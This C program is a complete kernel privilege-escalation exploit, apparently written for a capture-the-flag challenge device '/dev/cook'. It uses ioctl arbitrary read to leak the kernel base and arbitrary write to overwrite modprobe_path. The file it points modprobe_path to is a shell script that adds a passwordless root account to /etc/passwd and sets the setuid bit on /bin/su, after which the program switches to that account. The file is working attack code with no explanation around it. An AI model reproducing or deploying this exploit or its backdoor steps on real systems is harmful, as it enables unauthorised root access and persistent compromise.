#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#define DEVICE_NAME "/dev/cook"
#define MODPROBE_TRIGGER_PATH "/home/blud/x"
#define PWN_PATH "/home/blud/p"

int global_fd;

size_t image_base;

void _sioctl(size_t cmd, void *arg) {
    ioctl(global_fd, cmd, arg);
}

void open_dev(void) {
    global_fd = open(DEVICE_NAME, O_RDWR);
    if (global_fd < 0) {
        puts("[!] Failed to open device");
        exit(EXIT_FAILURE);
    }
    puts("[*] Device opened");
}

void aaw(uint64_t addr, uint64_t data) {
    uint64_t buf[] = {addr, data};
    _sioctl(0xfade, buf);
}

uint64_t aar(uint64_t addr) {
    uint64_t buf[] = {0xcafebabedeadbeef, addr};
    _sioctl(0x6969, buf);
    return buf[0];
}

void modprobe_init() {
    int fd = open(MODPROBE_TRIGGER_PATH, O_RDWR | O_CREAT);
    if (fd < 0) {
        puts("[!] Trigger creation failed");
        exit(EXIT_FAILURE);
    }
    char magic[] = "\xff\xff\xff\xff";
    write(fd, magic, sizeof(magic));
    close(fd);
    if (chmod(MODPROBE_TRIGGER_PATH, 0777)) {
        puts("[!] Error chmod trigger");
        exit(EXIT_FAILURE);
    }
}

void pwn_init() {
    int pwn_fd = open(PWN_PATH, O_CREAT | O_RDWR);
    if (pwn_fd < 0) {
        printf("[!] Unable to create %s\n", PWN_PATH);
        exit(EXIT_FAILURE);
    }
    dprintf(pwn_fd, "#!/bin/sh\n"
                    "echo 'pwned::0:0:root:/:/bin/sh' >> /etc/passwd\n"
                    "/bin/chown root:root /bin/su\n"
                    "/bin/chmod +s /bin/su");
    close(pwn_fd);
    if (chmod(PWN_PATH, 0777)) {
        puts("[!] Error chmod pwn");
        exit(EXIT_FAILURE);
    }
}

int main(void) {
    open_dev();
    // static memory address <https://ret2school.github.io/post/iwindow/>
    uint64_t leak = aar(0xfffffe0000002f50);
    printf("[*] leak: 0x%lx\n", leak);

    /* image_base = leak - 0xe00d3b; */
    image_base = ((leak >> 20) - 0xe) << 20;
    printf("[*] image base @ 0x%lx\n", image_base);

    if ((image_base & 0xfffff) != 0) {
        puts("[!] Incorrect image base");
        exit(EXIT_FAILURE);
        close(global_fd);
    }

    uint64_t modprobe_path = image_base + 0x1852420;

    char mppath1[] = "/home/bl";
    aaw(modprobe_path, (uint64_t)mppath1);

    char mppath2[] = "ud/p";
    aaw(modprobe_path + 0x8, (uint64_t)mppath2);
    puts("[*] overwritten modprobe_path");

    modprobe_init();
    pwn_init();
    system("/home/blud/x 2>/dev/null");
    system("cat /etc/passwd");
    system("su pwned");

    close(global_fd);

    return 0;
}
